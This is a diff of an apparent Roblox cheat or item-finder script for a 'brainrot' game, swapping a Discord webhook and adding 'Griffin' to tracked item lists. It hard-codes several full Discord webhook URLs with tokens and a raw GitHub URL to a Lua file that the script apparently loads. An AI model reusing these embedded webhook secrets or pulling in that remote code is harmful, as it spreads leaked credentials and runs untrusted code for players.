@@ -12,7 +12,7 @@ local localPlayer = Players.LocalPlayer
 local WEBHOOK_1_25M   = "https://discord.com/api/webhooks/1454372752034365566/EmLdd5U_wxp6Ziy8gAAiGB7MHpeWPaDBZzS8vfAQSD2dWsB0ZyPAEfDYK0n869ObblnT"
 local WEBHOOK_26_100M = "https://discord.com/api/webhooks/1456399330662682714/1HTEJNBTO1qhXMex8-5YBB1_Q5ekmyHtgvUJ886zitqpl6IC_aXhjKb5QgpjXns1s4uh"
 local WEBHOOK_101M    = "https://discord.com/api/webhooks/1456399389336801463/kyZ8kGtNnSL3Ee1YJteiCWdKWA_KlVFdUNEVAAWr9_kkwGJc6r-3Xg7D8w56aUxRfa1q"
-local WEBHOOK_SPECIAL = "https://discord.com/api/webhooks/1469225407139151873/RvlzIph2C_BEyAUdRPHQ8ev40nRCaQ4RhaCBuGTvbBYbH6ws5SJTozSbFbIHZQQQAz_W"
+local WEBHOOK_SPECIAL = "https://discord.com/api/webhooks/1479875137414103060/nowrpk9BnDaEwHjan8L43gl7PMOgoKv7NbKvxHDae4FYmbkono_ML6BiYLKokXk5lbN1"
 
 local GAME_ID    = 96342491571673
 local SERVER_URL = "https://raw.githubusercontent.com/dsfsdfs21cfc/yrhgnjrtyjh333/refs/heads/main/bdbrthh5serv.lua"
@@ -151,6 +151,7 @@ local SPECIAL_BRAINROTS = {
     ["Celestial Pegasus"]        = { min = 0, mutations = {} },
     ["Elefanto Frigo"]        = { min = 0, mutations = {} },
     ["Ventoliero Pavonero"]        = { min = 0, mutations = {} },
+    ["Griffin"]        = { min = 0, mutations = {} },
 
     
     
@@ -216,7 +217,7 @@ local OBJECT_NAMES = {
     "Chicleteira Cupideira","Love Love bear","Love Love Bear","La Romantic Grande",
     "La Food Combinasion","Popcuru and Fizzuru","Los Sekolahs","Los Amigos", "Antonio",
     "Sammyni Fattini","Tirilikalika Tirilikalako","Signore Carapace","Celestial Pegasus",
-    "Elefanto Frigo","Ventoliero Pavonero",
+    "Elefanto Frigo","Ventoliero Pavonero","Griffin",
 }
 
 -- ══════════════════════════════════════════════════════════════
